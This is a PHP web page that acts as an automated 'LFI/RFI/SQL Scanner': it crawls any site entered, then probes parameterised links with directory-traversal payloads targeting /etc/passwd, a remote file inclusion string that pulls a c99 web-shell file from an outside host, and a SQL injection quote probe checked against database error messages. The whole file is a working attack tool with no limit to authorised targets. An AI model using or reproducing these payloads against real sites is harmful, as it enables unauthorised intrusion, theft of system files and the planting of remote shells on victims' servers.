<html>
<head><title>LFI/RFI/SQL Scanner</title></head>
<?php
set_time_limit(0);
if (isset($_GET["do"])) {
	$do = explode(":",$_GET["do"]);
	if ($do[0] == "selected") {selected($do[1]); }
	elseif ($do[0] == "scantime") { scantime($do[1]); }

}   else { main(); }

function main(){
echo 'LFI, RFI, SQL - Scanner
<form action="" method="post">
Site to test: <input name="scan" type="text" />
<input type="submit" name="searchn" value="Scan"/>
</form>';
$link = $_POST['scan'];
preg_match('@^(?:http://)?([^/]+)@i',$link, $matches);
$host = $matches[1];

function getLinks($link) {
$ret = array();
$dom = new domDocument;
@$dom->loadHTML(file_get_contents($link));
$dom->preserveWhiteSpace = false;
$links = $dom->getElementsByTagName('a');
foreach ($links as $tag)
 {
 $ret[$tag->getAttribute('href')] = $tag->childNodes->item(0)->nodeValue;
 }
return $ret;
}
if (isset($_POST["searchn"])) {
echo '<form action="lfi.php?do=selected" method="post">';
echo "<br>Links found: <ol>";
if (preg_match("/=/", $link)) {
echo '<input name="sites[]" type="checkbox" id="sites[]" value="'.$link.'">'.$link.'<br>';
}
$urls = getLinks($link);
if(sizeof($urls) > 0)
{
foreach($urls as $key=>$value)
{
if (preg_match("/=/i", $key)) {
if (preg_match("/.com|.net|.org|.co.uk|.com.au|.us/", $key)) {
echo '<input name="sites[]" type="checkbox" id="sites[]" value="'.$key.'">'.$key.'<br>';
}
else{
echo '<input name="sites[]" type="checkbox" id="sites[]" value="'.$host.'/'.$key.'">'.$host.'/'.$key.'<br>';
}
}
}
echo "</ol>";
}
else
{
echo "</ol>";
echo "No exploitable links found at $link<br><br>";
}
echo "<input type='submit' value='Scan Sites'></form>";
}
}

function selected(){
echo '<form action="lfi.php?do=scantime" method="post">';
    $sites = $_POST['sites'];
	$n = count($sites);
	$i = 0;
    $r = 1;
	echo "Testing.." .
	     "<ol>";
	while ($i < $n)
	{
$site = "{$sites[$i]}";
$equals = strrpos($site,"=");
$siteedit = substr_replace($site, '', $equals+1);
echo "<br />$r. $siteedit<br />";
rfi($siteedit);
lfi($siteedit);
sql($siteedit);
$i++;
$r++;
	}
	echo "</ol>";
    echo "<a href='lfi.php'>Test again</a>";
}

function lfi($site) {
$lfifound = 0;
$lfi = array(
"/etc/passwd",
"../etc/passwd",
"../../etc/passwd",
"../../../etc/passwd",
"../../../../etc/passwd",
"../../../../../etc/passwd",
"../../../../../../etc/passwd",
"../../../../../../../etc/passwd",
"../../../../../../../../etc/passwd",
"../../../../../../../../../etc/passwd",
"../../../../../../../../../../etc/passwd",
"/etc/passwd%00",
"../etc/passwd%00",
"../../etc/passwd%00",
"../../../etc/passwd%00",
"../../../../etc/passwd%00",
"../../../../../etc/passwd%00",
"../../../../../../etc/passwd%00",
"../../../../../../../etc/passwd%00",
"../../../../../../../../etc/passwd%00",
"../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../etc/passwd%00"
);

$totallfi = count($lfi);
for($i=0; $i<$totallfi; $i++)
 {
$GET = @file_get_contents("$site$lfi[$i]");
if (preg_match("/root/i",$GET, $matches))  {
echo "LFI found: $site$lfi[$i]<br>";
$lfifound = 1;
}
}
if ($lfifound == 0) {
echo "No LFI found.<br>";
}
}

function rfi($site) {
$rfifound = 0;
$rfi = "http://www.evilc0der.com/c99.txt?";
$GET1 = @file_get_contents("$site$rfi");
if (preg_match("/root/i",$GET1, $matches))  {
echo "RFI found: $site$rfi<br>";
$rfifound = 1;
}
if ($rfifound == 0) {
echo "No RFI found.<br>";
}
}

function sql($site) {
$sqlfound = 0;
$sql = "99'";
$GET2 = @file_get_contents("$site$sql");
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET2, $matches))  {
echo "SQL found: $site$sql<br>";
$sqlfound = 1;
}
if ($sqlfound == 0) {
echo "No SQL found.<br>";
}
}
?>
</html>